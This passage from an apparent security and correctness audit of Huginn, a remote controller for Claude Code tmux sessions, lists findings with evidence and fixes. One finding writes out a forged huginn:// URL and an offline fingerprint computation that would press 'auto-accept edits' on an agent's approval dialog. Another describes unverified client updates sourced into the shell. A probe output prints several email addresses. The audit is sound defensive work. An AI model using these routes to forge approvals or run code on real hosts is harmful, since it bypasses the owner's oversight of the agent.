so `require()`-ing it binds a socket. `grep -rl "huginn-appd" server/appd/test/` -> NONE. Functions that exist only here and are therefore covered by nothing: validKey (line 630, the tmux key-name gate), authorized (151), canonName (227), acquireSize/releaseSize/sweepStrandedSizes (432/464/491 — the C6 lease sweeper), captureScreen (530), startRun (798), handleClaudeEvent (920), reconcileInterruptedRuns (1066), deliverOrphanedQueues (1091), resolveIdentity/saveIdentified (1134/1182 — C8 account identity), statusPayload (1392), deliverPush (1529), performSwitch (1631), alertTickInner (1784), startStateWatch (1969). The 385 tests cover lib/*.js only — a fact another lane's test-integration/answer-fingerprint.test.js header states independently.
```

</details>

**Suggested fix:** Add `if (require.main === module) { resolveBind().then(...) }` around the startup block and `module.exports = { validKey, canonName, authorized, statusPayload, ... }` so the pure helpers become reachable; then port test-integration/ under test/ for the route-level cases that genuinely need a spawned daemon. Start with validKey, canonName, authorized — three pure functions guarding the wire.

### `server/appd/lib/pane.js:195`

detectPrompt's option-run walk climbs past the plan-approval dialog's indented question and absorbs numbered plan-body lines, so any plan whose numbered steps reach within 24 lines of the pane bottom fails the 1..n contiguity check and the approval dialog is rendered card-less on BOTH clients.

**lane** lib/pane.js — prompt detector and all pane-reading regexes (C2) · **contract** C2 · **verdict** CONFIRMED by lead (L11) · **demonstrated by running it**

**What goes wrong:** Owner asks for a plan; Claude writes the ordinary '1. ... 2. ... 3. ...' step list; the visible plan fills down toward the dialog (guaranteed on phone-leased short panes where floor=lastContent-24 covers nearly the whole screen). Plan-approval card never appears on phone or desktop, no notification options, and the owner must answer through raw tmux — the exact 2026-08-03 blindness class, still live in deployed 2.52.2.

<details><summary>Evidence</summary>

```
Step-2 walk treats any line with 2+ leading spaces as an option description: `if (/^\s{2,}/.test(plain[j]) && ...) continue;` — the plan question ('   Claude has written up a plan...') is indent-3, so the walk continues above it and OPTION_RE collects plan steps ('   16. Report completion to the user.'), then `if (opts[k].number !== k + 1) return null;` rejects everything. LIVE-PROVEN: drove a real plan-mode session to a 16-step numbered plan; with 'Would you like to proceed?' visible on screen (cap-tallplan.txt rows 14-42 show steps 3-16 directly above the separator/question/options), detectPrompt returned null. Control: the same dialog with dash-bullet plan body ('- Create the file') IS detected (live cap-plan.txt and node demo B: dash=>PROMPT, numbered=>null). Permission dialogs are immune only because their question is indent-1 (<2 spaces breaks the walk).
```

</details>

**Suggested fix:** End the step-2 collection when the just-prepended option has number 1 (the live run's own start): after `opts.unshift(...)`, `if (m[2] === '1' && !CHECK_RE... ) break;` — or stop the walk at the first non-blank line above option 1 that is not a rule. Add a regression test: verbatim plan fixture with numbered plan body.

### `server/appd/lib/transcript.js:343`

A queue-operation `remove` read in a later tail window than its `enqueue` re-emits the full message as a fresh user event, so both clients' concat-merge shows the message twice with the first copy badged 'queued' forever.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **contract** C9 · **verdict** CONFIRMED (CONFIRMED:3) · **demonstrated by running it**

**What goes wrong:** Owner watches a busy session on the phone (2.5s transcript polls), types 'also fix the header' mid-turn -> CLI enqueues it -> next poll renders the queued-badged bubble. The turn ends 30s later, CLI writes the `remove` -> next poll's window contains only the remove -> server emits a second full 'also fix the header' user event -> conversation shows the message twice, the first permanently badged 'queued'. Reproduces on every send-while-busy whose turn outlives one poll interval (i.e. virtually always), on phone AND desktop.

<details><summary>Evidence</summary>

```
Line 341-343: `else if (content.trim() && !machineText(content)) { // The enqueue happened before the window we read. out.events.push({ seq: ++seq, kind: 'user', ts, sidechain, text: content }); }`. Ran it: page1 (cold open) = [{k:'user',t:'first question'},{k:'user',t:'follow up',q:true}]; appended assistant+remove+assistant, page2 = readTranscript(p,{offset:page1.nextOffset}) = [{k:'assistant','answer to first'},{k:'user','follow up',q:undefined},{k:'assistant','answer to follow up'}]; merged view has 2 'follow up' bubbles, badges [true,false]. Client merge verified: TranscriptMerge.kt mergeTranscript() only renumbers and concats (`(kept + renumbered).takeLast(cap)`), no queued reconciliation anywhere (grepped 'queued' across app/core/desktop main: only the Models.kt field and the UserBubble 'queued' chip at TranscriptView.kt:217-220); phone HuginnViewModel.startTranscriptPolling and desktop SessionController.transcriptLoop both tail with `offset = page.nextOffset` continuously.
```

</details>

**Verifier's correction:** Verdict unchanged; one wording nuance: the first copy is badged 'queued' for the life of the open view, not literally forever — the phone heals on re-entering the session view (startTranscriptPolling resets offset to null, cold-opens), while the desktop keeps its offset across hide/show so the duplicate persists until the session controller is recreated.

**Suggested fix:** readTranscript knows the difference: when `offset != null` (tail-follow, client has seen all earlier windows) emit the remove as a marker event (e.g. {kind:'queued_delivered', text: content}) instead of a full user event, and teach the single shared merge in :core to move/un-badge the newest still-queued event with equal text; keep the current full-event emission only for cold opens (offset == null), where the enqueue really was outside the window.

### `server/setup.sh:38`

The documented provisioning command `sudo bash huginn/server/setup.sh` installs a REGRESSED `cc` over the fixed one: the repo copy targets tmux sessions without the `=` exact-match anchor, so a unique-prefix name silently resolves to a different, live session and force-detaches its real client.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** CONFIRMED by lead (L28) · **demonstrated by running it**

**What goes wrong:** Operator follows docs/SETUP.md and runs `sudo bash /opt/huginn/server/setup.sh` on huginn (e.g. after `git -C /opt/huginn pull`, which huginn-sync does routinely). /usr/local/bin/cc reverts to the unanchored version. A later `huginn solo jt` (no session named `jt`; `jtyper` exists) runs `cc jt solo` -> `tmux has-session -t jt` returns 0 by prefix -> `tmux attach -d -t jt` force-detaches jtyper's real attached client mid-session. Same command on a freshly provisioned public-user host does this from day one.

<details><summary>Evidence</summary>

```
setup.sh:38 `install -m 0755 "$HERE/bin/cc" /usr/local/bin/cc`.
Repo /opt/huginn/server/bin/cc:22-23:
  if [ -n "$SOLO" ] && tmux has-session -t "$SESSION" 2>/dev/null; then
    exec tmux attach -d -t "$SESSION"
Deployed /usr/local/bin/cc has the fix:
  if [ -n "$SOLO" ] && tmux has-session -t "=$SESSION" 2>/dev/null; then
    exec tmux attach -d -t "=$SESSION"
RAN (repro): created `audit_zzqlong`, then
  tmux has-session -t 'audit_zzq'   -> EXIT_PREFIX=0   (matched the WRONG session)
  tmux has-session -t '=audit_zzq'  -> can't find session: audit_zzq, EXIT_ANCHORED=1
The repo copy also lacks the deployed copy's `SESSION="${SESSION,,}"` lowercase backstop, the `[ -d "$WORKDIR" ] ||` fallback, and the `'claude; exec "$SHELL" -l'` autostart.
/root/netplan/scripts/active/huginn-server/README.md states the hazard explicitly ("Do NOT run /opt/huginn/server/setup.sh on this host — it would overwrite these") but docs/SETUP.md, provision/generic-host.md and provision/proxmox-lxc.md all instruct users to run it, and setup.sh itself has no guard.
```

</details>

**Suggested fix:** Copy the deployed /usr/local/bin/cc (and huginn-status) back into /opt/huginn/server/bin/ so the repo is the source of truth again, then have setup.sh refuse to downgrade (compare a version marker, or `install -b` with a backup and a warning).

---

# MED

### `/var/lib/huginn-appd/accounts/964aefae83ccf2ba.json:1`

The live account store contains a phantom fourth account — a fingerprint-slugged record for an email that already has a uuid-keyed profile — and neither migrate() nor consolidate() can ever fold it, so /v1/accounts serves one login twice.

**lane** documentation drift and deployed-state drift · **contract** C8 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** In the app's Settings the owner sees four accounts for three logins, two of them the same email, distinguishable only by one having a blank org. Tapping the blank one calls `POST /v1/accounts/964aefae83ccf2ba/activate`, which writes a 10-day-old credentials blob over ~/.claude/.credentials.json; the refresh token has since rotated, so the host's Claude Code is left signed in as nobody until the owner works out which of the two identical-looking rows to activate. This is the residue of exactly the pathology the 2026-08-03 uuid fix closed — the fix stops new ones but leaves this one in prod.

<details><summary>Evidence</summary>

```
Live probe of `GET /v1/accounts` (read-only, bearer from /etc/huginn-appd/token), emails hashed rather than printed:
```
count: 4
 slug=55ccf945-faa6-41af-b48b-dfd37166878b emailhash=2e065eaa90 org=sunwinggaming@gmail.com's Organization
 slug=79c777a4-d96e-4de2-b95e-bd1f1e758236 emailhash=55794580f1 org=jacob@monahanhosting.com's Organization
 slug=e12d3fa9-fb80-4e4a-b286-36890d487fd4 emailhash=df200d4bca org=pnwforestry@outlook.com's Organization
 slug=964aefae83ccf2ba              emailhash=2e065eaa90 org=-
```
`964aefae83ccf2ba` shares its email hash with `55ccf945-...` and its on-disk record has `accountUuid=NONE`, `oauthAccountKeys=none`, `savedAt=1785197935` (2026-07-25); the other three all carry accountUuid + a full oauthAccount block.
Neither repair path reaches it. `consolidate()` (lib/accounts.js:400-405) starts `const uuid = storedUuid(e.rec); if (!uuid) continue;  // unidentifiable: leave it exactly as it is`. `migrate()` (lib/accounts.js:355-358) groups by credential fingerprint — this record is a group of one — and then `const settledName = \`${normUuid(group[0].rec.accountUuid) || print}.json\`; if (group.length === 1 && group[0].name === settledName) continue;` — with no accountUuid, settledName is `964aefae83ccf2ba.json`, its own name, so it is skipped on every boot forever.
```

</details>

**Suggested fix:** Extend `consolidate()` to fold an unidentifiable record into a uuid-keyed group when the email matches exactly and it is strictly older (archiving it to accounts/superseded/ rather than deleting), or hide records with no accountUuid and no live credentials from `/v1/accounts`. As a one-off, move 964aefae83ccf2ba.json into accounts/superseded/.

### `client/huginn.sh:148`

`huginn update`'s scp fallback pulls the client from the user-settable $HUGINN_HOST rather than a pinned source, and bash immediately `source`s the result into the live interactive shell — so a compromised huginn host gets code execution on every client device, inverting the host/client trust direction.

**lane** CLI client + server glue + provisioning (never audited) · **contract** C4 · **verdict** not separately verified

**What goes wrong:** huginn (LXC 117) is compromised — the very scenario docs/SECURITY.md contemplates ("rotate API keys if a host is compromised"). The attacker writes a payload into /usr/local/share/huginn-cli/huginn.sh. The next time the owner runs `huginn update` on PRESTIGE or the phone, scp fetches it, `bash -n` passes, `mv -f` installs it over ~/.huginn/huginn.sh, and `source` executes it in the live shell as the desktop user — lateral movement from an LXC to the owner's Windows box and phone. Same result if a user is talked into `export HUGINN_HOST=<attacker>` before updating.

<details><summary>Evidence</summary>

```
client/huginn.sh:90 `local H="${HUGINN_HOST:-huginn}"`
client/huginn.sh:148 `if scp -o BatchMode=yes "$H:/usr/local/share/huginn-cli/huginn.sh" "$tmp"; then`
client/huginn.sh:156 `if ! bash -n "$tmp" 2>/dev/null; then` — a SYNTAX check only; malicious-but-valid bash passes.
client/huginn.sh:161-163 `mv -f "$tmp" "$dest"` then `source "$dest"; huginn version` — executed immediately, no shell restart needed.
The gh path (line 138) IS pinned to the constant `HUGINN_REPO='silencelen/huginn'`, but it is tried first and skipped entirely when gh is absent — line 145 prints "(gh not installed - using the scp fallback)", which is the normal state on Termux. So on the phone the unpinned path is the ONLY path.
The mirror it pulls from, /usr/local/share/huginn-cli/, is refreshed by /root/netplan/scripts/active/huginn-server/huginn-sync:17-23, which does `git -C /opt/huginn pull --ff-only` and installs whatever came down with no verification.
Asymmetry worth noting: client/huginn.ps1:171-174 deliberately does NOT dot-source after update ("we don't pretend to hot-reload"), so only the bash client executes the fetched file on the spot.
```

</details>

**Suggested fix:** Make `update` pull only from the pinned $HUGINN_REPO (fail loudly if gh is unavailable rather than falling back), or verify a signature/known hash before install; and drop the immediate `source` in favour of telling the user to reload, as the PowerShell client already does.

### `client/install.sh:21`

Re-running the installer against a DIFFERENT host silently keeps the old HostName while printing "Installed.", so the client keeps talking to the previous box with no indication anything was ignored.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner moves huginn to a new LXC/IP and, per docs/SETUP.md, re-runs `bash huginn/client/install.sh <new-ip>` on the phone. The installer reports success. Every subsequent `huginn`, `huginn status`, and `huginn kill` still resolves to the dead old address; on Termux the failure surfaces as three sub-5s ssh exits and "huginn: <host> is failing immediately" with no hint that the config was never updated.

<details><summary>Evidence</summary>

```
install.sh:21-24:
  if ! grep -qE '^[[:space:]]*Host[[:space:]]+huginn[[:space:]]*$' "$CFG"; then
    printf '\nHost huginn\n  HostName %s\n ...' "$HHOST" ... >> "$CFG"
    echo "Added 'Host huginn' -> $HHOST to $CFG"
  fi
(no else branch — $HHOST is discarded)
RAN (repro) in a scratch HOME:
  RUN 1: install.sh 10.0.0.1     -> HostName 10.0.0.1
  RUN 2: install.sh 192.168.9.9  -> EXIT2=0, ssh config STILL `HostName 10.0.0.1`, final line printed: "Installed. Authorize the key above on the host, then:  huginn help  |  huginn status"
client/install.ps1:21-24 has the identical structure (`if (-not (Select-String -Path $cfg -Pattern '^\s*Host\s+huginn\s*$' -Quiet))`) and the same silent no-op.
```

</details>

**Suggested fix:** When the `Host huginn` block already exists, compare its HostName to $HHOST and either rewrite it or print a loud warning naming the existing value and the config path.

### `desktop/scripts/release.sh:127`

After two consecutive --linux-only releases the prune deletes the Windows installer that latest.yml still advertises, permanently breaking electron-updater for the owner's running Windows client.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Two Linux-only fixes are shipped in a row (a documented, supported flag; the Electron client is bug-fixes-only, which is exactly when someone reaches for it). The owner's Windows Huginn Desktop 0.4.0 polls /v1/desktop/latest.yml, is told 0.4.0 is current — but every one of its own launches now also has its cached blockmap/exe path gone, and the moment the next full Windows release bumps latest.yml, any client that was mid-cycle downloading 0.4.0 gets a 404. More concretely: any fresh Windows install pointed at the yml has no installer to fetch and the channel silently has no Windows build at all, with nothing in the script reporting it.

<details><summary>Evidence</summary>

```
--linux-only skips the Windows feed entirely (lines 107-112): `if [ "$LINUX_ONLY" = 0 ]; then install -m 644 dist/latest.yml "$DESKTOP_DIR/latest.yml.tmp"; fi` ... `[ "$LINUX_ONLY" = 1 ] || mv "$DESKTOP_DIR/latest.yml.tmp" "$DESKTOP_DIR/latest.yml"` — so latest.yml keeps naming the last FULL release.
The prune (lines 120-131) is version-based and blind to that: `const m = f.match(/(\d+\.\d+\.\d+)\.(exe|AppImage|deb)$/)` ... `for (const v of sorted.slice(keep))` with KEEP=2.
RAN the prune body verbatim on a scratch dir shaped like 0.4.0 (full) -> 0.5.0 (--linux-only) -> 0.6.0 (--linux-only):
  ->  pruned Huginn-Setup-0.4.0.exe
  ->  pruned huginn-desktop-0.4.0.AppImage / .deb
  latest.yml still says: `version: 0.4.0` / `path: Huginn-Setup-0.4.0.exe`
The daemon 404s a missing artifact (server/appd/lib/desktop.js resolveArtifact), verified live on the sibling channel.
```

</details>

**Suggested fix:** Never prune a version that any live feed file still names. Parse latest.yml / latest-linux.yml / manifest.json and add every version they reference to a keep-set before computing `doomed`. Better: refuse --linux-only outright when latest.yml's version is not among the versions being kept.

### `desktop/src/main/index.ts:296`

Turning notifications off in Settings does not reset the watch stream, so the parked SSE keeps re-stamping this desktop as a live notification route for up to 30 minutes — suppressing the household Telegram fallback while the desktop is deliberately muted.

**lane** Electron desktop client (/opt/huginn/desktop) — security + data-loss only · **contract** C7 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner opens Settings, unticks Notifications, then presses Ctrl+W (close to tray). The window is now hidden, so the renderer's 5s list poll stops (stores/app.ts:106-109, `if (document.hidden) return`) and no ordinary request carrying X-Huginn-Notify: 0 is ever sent. The only traffic left is the parked /v1/watch?stream=1 socket, which re-stamps notify:1 every 25 seconds from its connect-time header. Two minutes later a session goes to `attention`: NotifyRouter.sessionAttention returns immediately at shouldShow() because notifications are off, so the desktop shows nothing — and the daemon's appOnline() is true, so the Telegram fallback is suppressed. The alert reaches nobody for up to 30 minutes, until the stream's rotation reconnects with an honest header.

<details><summary>Evidence</summary>

```
The claim is computed live but only transmitted at connect time (index.ts:71-74): `notify: () => settings.getNotifyEnabled() && Notification.isSupported() && powerMonitor.getSystemIdleTime() < 600`. The code already knows a stale claim is the hazard and fixes exactly one cause of it (index.ts:289-303): "a parked SSE re-stamps its CONNECT-time header on every keepalive... Reconnect the watch stream when the idle state crosses the threshold, so the claim it carries is the true one." `grep -rn "watch.reset"` over src/ returns only index.ts:282 (powerMonitor resume/unlock) and index.ts:301 (idle crossing). settings.ts:188 flips the flag with no notification to anyone: `if (patch.notifyEnabled !== undefined) this.state.notifyEnabled = patch.notifyEnabled`. Daemon side confirms the re-stamp is real — huginn-appd.js:2226-2232, inside the stream's keepalive branch: `res.write(': ka ...'); nextKeepalive = ...; noteClient(req, 'stream');` using the original `req.headers['x-huginn-notify']` (huginn-appd.js:1465), and lib/clients.js appOnline() returns true for any client with notify !== false seen within FRESH_STREAM_MS, which is what holds back the Telegram fallback. The stream's own bound is MAX_MS = 30*60*1000.
```

</details>

**Suggested fix:** Give Settings an onChange hook for notifyEnabled (or have index.ts wrap settings.update) that calls watch.reset() whenever getNotifyEnabled() flips — the same one-liner the idle crossing already uses at index.ts:301.

### `desktop/src/main/notify/activation.ts:44`

The mandatory huginn://answer fingerprint is not a secret — it is a truncated SHA-1 of the question text and option labels, so anyone who can guess a stereotyped Claude Code dialog can compute a valid fp offline and forge the activation the guard was added to stop.

**lane** Electron desktop client (/opt/huginn/desktop) — security + data-loss only · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner has a session named `jtyper` sitting on Claude Code's plan-approval dialog ("Would you like to proceed?" / "1. Yes, and auto-accept edits" / "2. Yes, and manually approve edits" / "3. No, keep planning") and Huginn Desktop 0.4.0 running on his Windows box. He opens a malicious or compromised web page, which navigates to huginn://answer?session=jtyper&option=1&fp=2a30ac211c39 — a URL the attacker built entirely offline from published Claude Code strings. Chrome shows its "Open Huginn?" launch dialog (already suppressed if the owner ever ticked "Always allow"); on accept, app.on('second-instance') → handleActivation → sessions.answer fires, the daemon's fingerprint check passes because the hash genuinely matches the live prompt, and option 1 (auto-accept edits) is pressed on a root-equivalent agent host. The only thing the owner sees afterwards is an "Answered" toast.

<details><summary>Evidence</summary>

```
activation.ts:38-45 states the guarantee: "Anything on this machine can fire a huginn:// URL — a local process, or a web page the owner clicks through... With it, the answer only lands if it matches the exact question this app was showing." But the value it checks is produced by /opt/huginn-appd/lib/pane.js:367-377:

  function promptFingerprint(prompt) {
    const stable = JSON.stringify([
      prompt.question || '',
      prompt.options.map((o) => [o.number, o.label]),
    ]);
    return createHash('sha1').update(stable).digest('hex').slice(0, 12);
  }

No nonce, no session salt, no per-install secret — a pure function of two public product strings. RAN, with the production function and zero access to any live session:
  $ node -e "const pane=require('./lib/pane.js'); ...{question:'Would you like to proceed?',options:[{number:1,label:'Yes, and auto-accept edits'},{number:2,label:'Yes, and manually approve edits'},{number:3,label:'No, keep planning'}]}"
  fingerprint computed OFFLINE with zero access to the host: 2a30ac211c39
  caret moved -> 2a30ac211c39 same: true
The daemon then accepts it verbatim (huginn-appd.js:2754 `if (body.fingerprint && body.fingerprint !== live)`), and desktop main answers with no in-app confirmation (index.ts:131-149).
```

</details>

**Suggested fix:** Make the activation carry something the app minted rather than something the world can compute: when buildAttentionToast builds the buttons, generate a random single-use nonce per toast, keep it in a short-TTL map in main, put it in the huginn:// URL alongside the fingerprint, and have handleActivation refuse any answer whose nonce is unknown or already spent. Keep the prompt fingerprint as the daemon-side check-and-act guard — it is a correct CAS token, just not an authenticator.

### `docs/ADDING-A-FEATURE.md:49`

ADDING-A-FEATURE.md names the glyph blit as one of the project's `expect`/`actual` declarations and puts the total at four; the glyph blit is a parameter (CellPainter), and there are two expects in the whole repo.

**lane** documentation drift and deployed-state drift · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A contributor adding a rendering difference between phone and desktop reads line 49, sees the glyph blit listed as legitimate precedent for `expect`/`actual`, and declares `expect fun drawGlyph(...)`. That compiles and works — until a desktop window is narrowed to a phone's width, at which point the platform-keyed implementation cannot give the phone's answer, which is exactly the runtime-vs-platform distinction the paragraph above was written to prevent. It also breaks the audit contract that only four legit expect/actuals exist.

<details><summary>Evidence</summary>

```
docs/ADDING-A-FEATURE.md:48-50: "Reach for `expect`/`actual` only when the platform API itself differs — the HTTP engine, the IO dispatcher, the glyph blit. There are four in the whole project".
Grep for declarations across core/ui/app/app-desktop returns exactly two:
```
core/src/commonMain/kotlin/com/silencelen/huginn/data/Platform.kt:19:expect fun huginnHttpEngine(): HttpClientEngine
core/src/commonMain/kotlin/com/silencelen/huginn/data/Platform.kt:31:expect val huginnIoDispatcher: CoroutineDispatcher
```
(four `actual`s, two per target, in Platform.jvm.kt and Platform.android.kt). The glyph blit is not among them — mobile/README.md:288-289 gets it right: "a `CellPainter` for the glyph blit — never an `expect`/`actual`, so a window narrowed to a phone's width can be given the phone's answer" — and the same ADDING-A-FEATURE doc says so itself four lines earlier ("Prefer a **parameter** over `expect`/`actual`").
```

</details>

**Suggested fix:** Change docs/ADDING-A-FEATURE.md:48-50 to "the HTTP engine and the IO dispatcher. There are two in the whole project" and cite the glyph blit as the worked example of a parameter instead.

### `docs/ARCHITECTURE.md:33`

docs/ARCHITECTURE.md — the doc README links as THE architecture reference — still describes the pre-2026-07 project and asserts "No daemon, no web server, no ports beyond SSH", which is false for three of the repo's four top-level components; docs/SECURITY.md:9 carries the matching false claim "There is no extra auth layer."

**lane** documentation drift and deployed-state drift · **verdict** not separately verified

**What goes wrong:** A contributor (or the owner six months from now) follows README -> docs/ARCHITECTURE.md to understand the system before changing it, and comes away believing there is no network service. They then reason about the security model from docs/SECURITY.md's checklist — all of which is about SSH — and never harden, rotate, or even notice /etc/huginn-appd/token, a credential that is equivalent to root on the agent host and is currently served on 0.0.0.0:8787.

<details><summary>Evidence</summary>

```
docs/ARCHITECTURE.md:33: "**SSH is the only transport.** No daemon, no web server, no ports beyond SSH." docs/SECURITY.md:9: "**There is no extra auth layer.** Huginn is SSH + tmux; your SSH posture *is* your security posture."
But README.md:113-116 lists `server/appd/` ("the phone daemon"), `mobile/` and `desktop/`; huginn-appd.js:3189 `server.listen(PORT, bind, ...)` on 8787; and the pieces list in ARCHITECTURE.md (lines 24-27) names only `huginn`, `cc`, `tmux.conf`, `huginn-status`. Neither ARCHITECTURE.md nor SECURITY.md nor SETUP.md mentions huginn-appd, the bearer token, the phone/desktop clients or the update channels. server/setup.sh (read in full) installs only cc/huginn-status/huginn-claude-title/tmux.conf — it does not install the daemon, so SETUP.md's "three parts" leaves the whole HTTP stack undocumented.
```

</details>

**Suggested fix:** Add an appd/clients section to docs/ARCHITECTURE.md (daemon, port, bearer token, the two update channels) and a corresponding section to docs/SECURITY.md covering the token as a second auth layer; add the appd deploy step to docs/SETUP.md or explicitly scope SETUP.md to the CLI-only install.

### `docs/DESKTOP-MIGRATION.md:246`

DESKTOP-MIGRATION.md's phase-4 status says the desktop self-updater is "Not wired yet: nothing calls `DesktopUpdater.start()` and the Settings screen does not show update state" — both halves have been false since at least 0.3.0.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified

**What goes wrong:** Someone picks up the migration doc to finish phase 4, writes a second `start()` call site and a second Settings update panel, and ships a client that polls the update feed twice and can offer two conflicting update states — or, more likely, skips reviewing the updater during an audit because the doc says it is inert, missing the fact that a background component is fetching and sha256-verifying executables on the owner's daily driver.

<details><summary>Evidence</summary>

```
docs/DESKTOP-MIGRATION.md:246-248: "**Not wired yet**: nothing calls `DesktopUpdater.start()` and the Settings screen does not show update state. Both are small..."
Grep of app-desktop/src/main:
```
AppStore.kt:294:        updater.start(scope)
AppStore.kt:70:    val updater = DesktopUpdater(tokenProvider = { settings.tokenNow() })
Main.kt:449:            LaunchedEffect(Unit) { store.start() }
```
and `SettingsView.kt` is the file that matches `updateState|UpdateState`. mobile/app-desktop/CHANGELOG.md's uncommitted 0.3.2 section is entirely about the update section's behaviour in Settings ("Settings said 'update check failed' for four hours"), which is only possible if it is both started and displayed.
```

</details>

**Suggested fix:** Delete the "Not wired yet" bullet from docs/DESKTOP-MIGRATION.md:246-248 and record where the updater is started (AppStore.kt:294) and surfaced (SettingsView.kt).

### `mobile/README.md:59`

mobile/README's upload documentation is wrong in both directions: it states a 20MB cap where the daemon enforces 128MB, and says binaries are "refused at upload by an allowlist" when the daemon deliberately refuses nothing by type.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified

**What goes wrong:** A contributor building a second client reads the API table, implements a client-side allowlist of jpeg/png/webp/gif and a 20MB pre-flight check, and their client silently refuses the router-backup and log-file uploads the daemon was explicitly changed to accept — reintroducing by hand the wall the 2.52.0 release tore down. Conversely, anyone sizing disk for /var/lib/huginn-appd from the README under-provisions by 6.4x per upload.

<details><summary>Evidence</summary>

```
mobile/README.md:48-51: "...or any file huginn can genuinely read — PDFs and text formats; binaries that Read would print as garbage are **refused at upload by an allowlist**"; :59 "(server-named, 20MB cap, pruned after 7 days)"; :194 "| POST | `/v1/uploads` | raw image bytes (jpeg/png/webp/gif, ≤20MB) ...".
server/appd/huginn-appd.js:57 `const UPLOAD_MAX_BYTES = 128 * 1024 * 1024;` and the route at :2870-2872:
```
      // Never refused for its type: see lib/uploads. A router backup is not
      // Readable but IS inspectable, and blocking it blocked the owner.
      const ext = uploadExtFor(mime, name);
```
lib/uploads.js:11-14 documents the reversal outright: "So nothing is refused for its TYPE any more." The change shipped as mobile/CHANGELOG.md's top entry ("2.52.0 / appd 2.47.0 — Any file can be sent now, including router backups"); only the README kept the old contract.
```

</details>

**Suggested fix:** Rewrite mobile/README.md:48-51, :59 and :194 to match lib/uploads.js: nothing is refused by type, the cap is 128MB, and the response carries `readable` so the client can phrase the message as Read-it vs inspect-it-with-a-shell.

### `mobile/README.md:170`

The CLI and the daemon disagree on what a legal session name is — appd accepts `.` and `-`, the huginn CLI rejects them — so a session created from the phone or desktop can be unreachable from the terminal; the README and the daemon's own 400 message both state the narrower rule.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified

**What goes wrong:** The owner creates a session named `dt-parity` from the desktop client — appd accepts it and tmux creates it. Back at a terminal, `huginn dt-parity` prints "huginn: invalid session name 'dt-parity' (use letters, digits, underscore; no - or *). Did you mean a subcommand?", and so do `huginn kill dt-parity` and `huginn solo dt-parity`. The session is running, visible in `huginn list`, and unreachable from the CLI; it can only be killed with raw `tmux kill-session`.

<details><summary>Evidence</summary>

```
mobile/README.md:170: "| POST | `/v1/sessions` | `{name}`; letters/digits/underscore, canonically lowercase |" and huginn-appd.js:2543 `sendErr(res, 400, 'invalid session name (letters, digits, underscore)')`.
The actual daemon rule, huginn-appd.js:225: `const NAME_RE = /^[A-Za-z0-9_][A-Za-z0-9_.-]{0,49}$/;` — dot and hyphen are legal after the first character.
The CLI rule, client/huginn.sh:16: `_huginn_valid_name() { [[ "$1" =~ ^[A-Za-z0-9_]+$ ]]; }` and every subcommand gates on it, e.g. :208-210 for `kill` and the fallthrough attach at :222.
```

</details>

**Suggested fix:** Pick one rule. Either tighten NAME_RE in huginn-appd.js:225 to `^[A-Za-z0-9_]{1,50}$` (matching the CLI and both error messages), or widen `_huginn_valid_name` in huginn.sh and huginn.ps1 to accept `.`/`-` after the first character. Then make mobile/README.md:170 state whichever it is.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/Main.kt:380`

The window key handler never passes the `typing` flag to match(), so the entire typing-suppression rule — documented in Shortcuts.kt and covered by three assertions in ShortcutsTest — is dead code: Escape and F1 fire while the composer has focus.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner is halfway through typing a multi-line instruction into an open session's composer and presses Esc — intending to cancel an autocomplete or just out of habit. It bubbles to the window handler, `match` is called with typing=false, returns Shortcut.BACK, and `store.back()` closes the session: the detail pane is replaced by "No session open", the SessionController is torn down and the pane lease released, and he has to find the session again. Pressing F1 mid-sentence is worse — it opens the cheat sheet, which (see the previous finding) he then cannot close with the keyboard at all.

<details><summary>Evidence</summary>

```
The only production call site, Main.kt:379-381, omits the parameter and takes its default:

  val shortcut = keyName(e.key)?.let {
      match(e.isCtrlPressed, e.isShiftPressed, e.isAltPressed, it)
  }

Shortcuts.kt:51-57 declares `typing: Boolean = false` and Shortcuts.kt:45-49 states the intended contract: "true when focus is in a text field. Almost everything is suppressed there — a shortcut that steals a keystroke mid-sentence is worse than a missing shortcut". Shortcuts.kt:66-73 is the branch it gates:

  if (!ctrl) {
      // Escape leaves a field before it leaves a view, so the shell only sees
      // it when nothing is being typed into.
      if (typing) return null
      return when (key) { "ESCAPE" -> Shortcut.BACK; "F1" -> Shortcut.CHEATSHEET; else -> null }

Ran: `grep -rn "match(" src/main/` returns exactly two hits — Main.kt:380 and the declaration itself. The behaviour is nonetheless asserted as if it were live, ShortcutsTest.kt:30-31:

  assertNull(match(false, false, false, "ESCAPE", typing = true))
  assertNull(match(false, false, false, "F1", typing = true))

so the green suite says the rule works. Window `onKeyEvent` is the last-chance handler: a key the focused OutlinedTextField does not consume (Escape and F1 are not in Compose's text-field key mapping) bubbles up to it.
```

</details>

**Suggested fix:** Thread the real answer through. Track whether a text field holds focus (a CompositionLocal or a MutableState the composers set via `onFocusChanged`), read it in Main.kt's handler and pass it as `match(..., typing = typingNow)`. Ctrl-chords and Alt+arrows are unaffected — the table already only gates the bare-key branch.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/Main.kt:383`

The cheat sheet overlay swallows every shortcut including its own dismissal, so neither Esc nor F1 closes it despite the overlay printing "Esc or F1 closes this" — the only way out is a mouse click on the scrim.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** not separately verified

**What goes wrong:** Owner presses F1 to check a binding. The cheat sheet opens. He presses Esc — nothing. He presses F1 again — nothing. Ctrl+K, Ctrl+1, Ctrl+2 are all dead too, because `overlay -> false` drops them. In a client whose entire cheat sheet is about keyboard control, the only exit is to reach for the mouse and click outside the card.

<details><summary>Evidence</summary>

```
